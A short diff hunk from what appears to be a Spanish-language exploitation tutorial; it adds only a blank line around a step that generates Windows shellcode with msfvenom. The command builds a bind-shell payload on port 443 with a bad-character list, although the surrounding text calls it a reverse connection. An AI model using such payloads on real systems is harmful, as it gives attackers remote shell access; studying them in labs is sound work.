@@ -118,6 +118,7 @@ pip install .
 El siguiente paso será generar una **shellcode**, con el objetivo de obtener una conexión reversa hacía nuestro equipo.
 
 Se nos recomienta estas, deberemos moficarlas para adaptarlas a nuestro entorno de red.
+
 ```
 msfvenom -p windows/shell_bind_tcp RHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
 
